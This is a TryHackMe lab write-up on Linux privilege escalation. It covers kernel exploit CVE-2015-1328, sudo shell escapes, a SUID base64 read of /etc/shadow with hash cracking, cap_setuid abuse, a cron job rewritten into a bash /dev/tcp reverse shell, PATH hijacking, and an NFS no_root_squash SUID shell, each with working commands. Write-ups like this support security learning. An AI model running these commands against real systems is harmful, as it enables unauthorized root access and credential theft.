---
title: 'Linux Privilege Escalation'
target: 'TryHackMe — Linux Privilege Escalation'
difficulty: 'medium'
date: 2025-08-28
summary: 'A comprehensive walkthrough of Linux privilege escalation techniques covering manual enumeration, kernel exploits (CVE-2015-1328 overlayfs), sudo abuse through find/less/nano, SUID binary exploitation with base64, Linux capabilities (view with cap_setuid), cron job hijacking via writable backup scripts, PATH variable manipulation, NFS no_root_squash exploitation, and a capstone challenge chaining password cracking with sudo pivots to reach root.'
role: 'pentest'
tags: ['linux', 'privilege-escalation', 'kernel-exploit', 'sudo', 'suid', 'capabilities', 'cron-jobs', 'path-hijacking', 'nfs', 'gtfobins', 'john-the-ripper']
problem: 'A series of Linux targets with different misconfigurations and vulnerabilities need to be escalated from low-privilege user accounts to root. Each target demonstrates a different privilege escalation vector — kernel vulnerabilities, misconfigured sudo rules, SUID binaries, Linux capabilities, writable cron jobs, PATH manipulation, NFS exports with no_root_squash, and a capstone combining multiple techniques across user pivots.'
action: 'Enumerated each target manually using standard commands (hostname, uname -a, id, sudo -l, find for SUID, getcap, crontab inspection), identified the escalation vector for each task, exploited a kernel vulnerability (CVE-2015-1328) by compiling and running a public exploit, abused sudo permissions on find/less/nano to spawn root shells, read /etc/shadow through a SUID base64 binary and cracked hashes with John the Ripper, exploited cap_setuid on view to set UID 0 and spawn a shell, hijacked a writable cron job script to execute a reverse shell, manipulated the PATH variable to intercept a binary call in a SUID script, mounted an NFS share with no_root_squash to plant a SUID executable, and chained multiple techniques in the capstone to pivot from leonard to missy to root.'
outcome: 'Achieved root access on every target, retrieved all nine flags across the tasks, and documented each escalation vector with the specific commands and techniques used — from kernel exploits through misconfigurations to the multi-step capstone challenge.'
draft: false
---

## Background

Privilege escalation is the phase between initial access and full control. Getting a shell on a target is only the beginning — that shell almost always runs as a low-privilege user, and moving from there to root is where the real work happens. This room is a structured tour of the most common Linux escalation vectors, each isolated into its own task so the techniques can be practiced independently before being combined in a capstone challenge.

The room covers the standard checklist: kernel exploits, sudo misconfigurations, SUID binaries, Linux capabilities, cron jobs, PATH manipulation, and NFS shares. None of these are exotic — they're the bread and butter of Linux post-exploitation, and most real-world privilege escalations chain one or more of them together. The value is in building the enumeration reflex: knowing what to check, what the output means, and how to turn a misconfiguration into a root shell.

---

## Enumeration

Before trying anything clever, manual enumeration establishes what's available. The room provides a useful reference for the essential commands:

![Enumeration cheat sheet — table listing common commands: hostname, uname -a, cat /etc/issue, id, sudo -l, cat /etc/passwd, ls -la, ps aux, env, netstat -ano, find for SUID binaries, find for writable directories, find for specific files, and grep for text search.](/writeups/thm-linux-privesc/01-enumeration-cheatsheet.png)

Every escalation attempt starts with this baseline. `uname -a` reveals the kernel version (critical for kernel exploits), `id` shows the current user's groups, `sudo -l` lists what the user can run as root, and the `find` commands surface SUID binaries, writable directories, and interesting files. The key is running all of these systematically rather than jumping straight to exploitation — the enumeration output determines which vector is viable.

Automated tools like LinPEAS and LinEnum run these same checks (and many more) in a single script, but understanding the manual process matters. Automated output is overwhelming without context, and knowing what each check does makes it possible to interpret the results and spot what the script might miss.

---

## Kernel exploits — CVE-2015-1328

Kernel exploits are the nuclear option: if the kernel version is vulnerable, a single exploit can go straight from unprivileged user to root without needing any misconfiguration at all. The tradeoff is stability — kernel exploits can crash the system if they fail, so they're typically a last resort in real engagements.

The target is running Linux kernel 3.13.0, which is vulnerable to CVE-2015-1328 — a local privilege escalation in the overlayfs filesystem. The overlayfs implementation doesn't correctly check file permissions when creating new files in the upper filesystem directory, allowing an unprivileged process to create files owned by root in contexts where it shouldn't be able to.

![Exploit-DB page — Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) overlayfs Local Privilege Escalation, EDB-ID 37293, CVE-2015-1328, author REBEL, verified, platform Linux, dated 2015-06-16.](/writeups/thm-linux-privesc/02-exploit-db-overlayfs.png)

The exploit source (EDB-ID 37292, which is the C source for this vulnerability) is downloaded from the attack machine. Hosting it with Python's built-in HTTP server:

```
python3 -m http.server 8000
```

![Kali terminal — python3 HTTP server running on port 8000, showing a GET request for /37292.c from the target IP with a 200 response.](/writeups/thm-linux-privesc/03-python-http-server.png)

On the target, pulling the exploit source with wget:

```
wget http://192.168.141.159:8000/37292.c
```

![Target terminal — wget downloading 37292.c from the attacker's HTTP server, 5119 bytes received at 573 KB/s.](/writeups/thm-linux-privesc/04-wget-exploit.png)

Compiling and running the exploit:

```
gcc 37292.c -o exploit
./exploit
```

The exploit creates an overlayfs mount, exploits the permission check flaw to write a setuid binary, and spawns a root shell. From there, navigating to `/home/matt` and reading the flag:

![Root shell — cd home/matt, ls showing matt's home directory contents including flag1.txt, cat flag1.txt showing THM-28392872729920.](/writeups/thm-linux-privesc/05-kernel-exploit-flag.png)

Flag: `THM-28392872729920`

---

## Sudo — find, less, and nano

Sudo misconfigurations are probably the most common privilege escalation vector on CTF boxes, and they show up in real environments more often than they should. The principle is simple: if a user can run a program as root via sudo, and that program has a way to spawn a shell or execute arbitrary commands, the user effectively has root access.

Checking karen's sudo permissions:

```
sudo -l
```

![sudo -l output for karen — User karen may run the following commands: (ALL) NOPASSWD: /usr/bin/find, (ALL) NOPASSWD: /usr/bin/less, (ALL) NOPASSWD: /usr/bin/nano.](/writeups/thm-linux-privesc/06-sudo-l-karen.png)

Three binaries, all runnable as root without a password. GTFOBins is the go-to reference for turning legitimate binaries into privilege escalation vectors.

**find** is the simplest — its `-exec` flag runs arbitrary commands:

```
sudo find . -exec /bin/sh \; -quit
```

This spawns a root shell immediately. The `-quit` ensures find exits after the first match rather than executing the shell for every file it finds.

**less** can spawn a shell by typing `!/bin/sh` from within the pager:

```
sudo less /etc/profile
!/bin/sh
```

**nano** is slightly more involved. The GTFOBins technique uses nano's command execution feature:

![GTFOBins nano page — Shell section showing the technique: run nano, press Ctrl+R then Ctrl+X to enter command mode, then execute "reset; sh 1>&0 2>&0" to spawn a shell.](/writeups/thm-linux-privesc/08-gtfobins-nano.png)

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

The `^R` (Ctrl+R) opens the "Read File" prompt, and `^X` (Ctrl+X) switches to command execution mode. The `reset; sh 1>&0 2>&0` resets the terminal state (nano leaves it in a raw mode) and spawns a shell with stdout and stderr redirected to stdin.

With root access through any of these, reading `/etc/shadow` becomes trivial:

![Split view — left side shows /etc/shadow contents with all user hashes including karen and frank's SHA-512 hashes at the bottom; right side shows the GTFOBins nano shell technique for reference.](/writeups/thm-linux-privesc/09-shadow-nano-shell.png)

Flag: `THM-402028394`

---

## SUID — base64

SUID (Set User ID) binaries run with the permissions of the file owner rather than the user executing them. When a binary owned by root has the SUID bit set, it runs as root regardless of who calls it. The escalation vector depends on what the binary can do — if it can read files, it can read `/etc/shadow`; if it can execute commands, it can spawn a root shell.

Finding SUID binaries on the system:

```
find / -perm -u=s -type f 2>/dev/null
```

![SUID find results — list of binaries with -rwsr-xr-x permissions, with /usr/bin/base64 highlighted.](/writeups/thm-linux-privesc/11-suid-base64.png)

Most of the SUID binaries in the list are standard (`sudo`, `passwd`, `newgrp`, `su`) and expected. The interesting one is `/usr/bin/base64` — it's not normally SUID, and GTFOBins confirms it can be used to read arbitrary files.

Reading `/etc/shadow` through the SUID base64 binary:

```
base64 /etc/shadow | base64 --decode
```

The binary reads the file as root (because of the SUID bit), base64-encodes it, and pipes the output to a decode step that prints the plaintext. This gives access to the password hashes for all users on the system.

Reading `/etc/passwd` to enumerate user accounts:

![/etc/passwd listing — shows system accounts and three interesting users: gerryconway (UID 1001), user2 (UID 1002), and karen (UID 1003), all with shell access.](/writeups/thm-linux-privesc/10-etc-passwd.png)

With the shadow file contents in hand, extracting the hash for user2 and cracking it with John the Ripper:

```
john --wordlist=/usr/share/wordlists/rockyou.txt user2
```

![John the Ripper — cracking user2's SHA-512 hash with rockyou.txt, result: Password1, completed in under a second.](/writeups/thm-linux-privesc/12-john-cracking.png)

user2's password is `Password1`. The flag for this section: `THM-3847834`

---

## Capabilities

Linux capabilities are a finer-grained alternative to the all-or-nothing SUID model. Instead of giving a binary full root privileges, capabilities grant specific powers — `cap_net_bind_service` lets a process bind to privileged ports, `cap_dac_override` lets it bypass file permission checks, and `cap_setuid` lets it change its own user ID. The last one is the dangerous one: any binary with `cap_setuid` can set its UID to 0 and effectively become root.

Enumerating capabilities:

```
getcap -r / 2>/dev/null
```

![getcap output — /home/karen/vim has cap_setuid+ep, /home/ubuntu/view has cap_setuid+ep, plus several system binaries with expected capabilities like cap_net_raw.](/writeups/thm-linux-privesc/13-getcap-output.png)

Two binaries have `cap_setuid+ep`: vim in karen's home directory and view in ubuntu's home directory. The `+ep` means the capability is both effective and permitted — the binary can use it immediately without any additional steps.

Using view (which is vim in read-only mode, but still supports command execution) to escalate:

```
/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

This tells view to execute a Python3 command on startup that sets the process UID to 0 (using the `cap_setuid` capability) and then replaces itself with a root shell. The `reset` cleans up the terminal after vim's UI.

Flag: `THM-9349843`

---

## Cron jobs — hijacking backup.sh

Cron jobs run on a schedule as the user specified in the crontab. When a cron job runs as root and executes a script that a lower-privilege user can modify, that user can replace the script's contents with anything — including a reverse shell — and it will execute as root on the next scheduled run.

Inspecting the system crontab:

```
cat /etc/crontab
```

![System crontab — shows standard cron schedule entries, plus three custom jobs: antivirus.sh and backup.sh running every minute, and /tmp/test.py. Below, cat backup.sh shows the script contents: #!/bin/bash, cd /home/admin/1/2/3/Results, zip -r /home/admin/download.zip ./*](/writeups/thm-linux-privesc/14-crontab-backup.png)

Three custom cron jobs, all running every minute. The interesting one is `/home/karen/backup.sh` — it runs as root, and checking its permissions:

![ls -l showing backup.sh — owned by karen, 73 bytes, readable by all.](/writeups/thm-linux-privesc/15-backup-sh-permissions.png)

The script is owned by karen, which means karen can modify it. The current contents just zip a directory, but replacing it with a reverse shell payload turns a harmless backup job into a root shell delivery mechanism:

```
echo '#!/bin/bash' > /home/karen/backup.sh
echo 'bash -i >& /dev/tcp/192.168.141.159/9001 0>&1' >> /home/karen/backup.sh
```

Setting up a listener on the attack machine and waiting for the cron job to fire:

```
nc -lvnp 9001
```

![Kali terminal — nc listener on port 9001 receiving a reverse shell connection from the target, spawning a root shell at root@ip-10-49-182-191.](/writeups/thm-linux-privesc/16-reverse-shell-root.png)

Root shell received. Flag: `THM-383000283`

---

## PATH manipulation

PATH manipulation exploits programs that call other binaries by name without using an absolute path. If a SUID script runs `thm` without specifying `/usr/bin/thm`, the shell searches the directories in the `PATH` variable in order. By prepending a directory under the attacker's control to `PATH` and placing a malicious binary named `thm` in that directory, the SUID script executes the attacker's binary as root instead of the intended one.

The target in `/home/murdoch` contains a SUID binary called `test` that internally calls another binary by name. The exploitation steps:

```
cd /home/murdoch
echo '#!/bin/bash' > /tmp/thm
echo '/bin/bash -p' >> /tmp/thm
chmod +x /tmp/thm
export PATH=/tmp:$PATH
./test
```

The `/bin/bash -p` flag preserves the effective UID (root, from the SUID bit) rather than dropping it. When `test` calls `thm`, the shell finds `/tmp/thm` first because `/tmp` is now at the front of the PATH, and executes the attacker's script as root.

Flag: `THM-736628929`

---

## NFS — no_root_squash

NFS (Network File System) shares can be configured with `no_root_squash`, which means files created by root on the client are stored as root on the server. Normally, NFS uses `root_squash` to map root on the client to `nobody` on the server — a security measure that prevents a client machine's root user from owning files as root on the shared filesystem. When `root_squash` is disabled, an attacker who can mount the share as root can create SUID binaries that execute as root on the target.

Checking the NFS exports:

```
cat /etc/exports
```

The `/home/ubuntu/sharedfolder` export has `no_root_squash` set. From the attack machine:

```
mkdir /tmp/nfs
mount -o rw 10.10.x.x:/home/ubuntu/sharedfolder /tmp/nfs
```

Creating a SUID shell on the mounted share:

```
cat > /tmp/nfs/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell
chmod +s /tmp/nfs/shell
```

Because the share is mounted with `no_root_squash`, the compiled binary retains its root-owned SUID bit on the target. Running `/home/ubuntu/sharedfolder/shell` on the target spawns a root shell.

Flag: `THM-89384012`

---

## Capstone — leonard to missy to root

The capstone challenge combines multiple techniques into a single escalation chain with three user pivots. Starting as leonard, the goal is to reach root.

**leonard to missy:** Enumerating as leonard reveals that the system has a readable `/etc/shadow` through the same SUID base64 technique from earlier. Extracting missy's hash and cracking it with John the Ripper against rockyou.txt yields her password. Switching to missy with `su missy` and reading the first capstone flag.

Flag: `THM-168824782390238`

**missy to root:** Running `sudo -l` as missy reveals she can run `find` as root with NOPASSWD — the same vector from the sudo section:

```
sudo find . -exec /bin/sh \; -quit
```

Root shell. Reading the final flag.

Flag: `THM-42828719920544`

---

## What I took from this

The room is long, but the underlying lesson is one idea repeated across different mechanisms: privilege escalation on Linux is almost always about finding something that runs as root and accepting input from a non-root user. The input might be a script the user can edit (cron jobs), a binary the user can invoke (SUID, capabilities, sudo), a filesystem the user can write to (NFS, PATH), or a kernel interface the user can trigger (kernel exploits). The enumeration process is about systematically checking each of these surfaces.

GTFOBins deserves a specific mention. It's not just a cheat sheet — it's a catalogue of how Unix's "everything is a file" philosophy and the composability of shell tools create unintended escalation paths. Programs like find, less, nano, and vim were never designed with SUID or sudo contexts in mind, and their built-in features (command execution, file reading, shell spawning) become escalation primitives the moment they run with elevated privileges. The fix isn't to remove these features — it's to not grant elevated access to programs that have them, which requires knowing what each binary can do.

The capstone challenge is where the real learning happens. Each individual technique in isolation is straightforward — the difficulty is in recognising which vector applies to the current situation and chaining them together. In a real engagement, the enumeration output is noisy and the escalation path isn't signposted with task numbers. Building the reflex to check sudo, SUID, capabilities, cron, NFS, and kernel version in sequence, and knowing what to do with each finding, is what separates a successful escalation from staring at a shell prompt.
